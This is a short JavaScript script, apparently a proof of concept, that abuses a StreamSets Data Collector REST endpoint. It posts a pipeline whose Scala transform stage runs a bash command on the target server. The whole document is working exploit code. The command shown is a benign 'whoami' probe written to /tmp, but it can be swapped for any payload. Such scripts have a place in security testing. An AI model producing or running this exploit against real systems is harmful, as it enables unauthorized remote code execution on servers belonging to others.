const base = process.argv[2];
const source = `import scala.sys.process._
Seq("bash", "-c", "whoami > /tmp/check-result 2>&1").!!
output = inputs(0)`;
const pipeline = {
  configuration: [{name: 'executionMode', value: 'BATCH'}],
  stages: [{stageName: 'com_streamsets_pipeline_spark_transform_scala_ScalaDTransform',
            stageVersion: '3', library: 'streamsets-spark-basic-lib',
            configuration: [{name: 'code', value: source}]}]
};
fetch(base + '/rest/v1/pipeline/current?rev=0', {
  method: 'POST',
  headers: {'X-Requested-By': 'SDC', 'Content-Type': 'application/json'},
  body: JSON.stringify(pipeline)
});
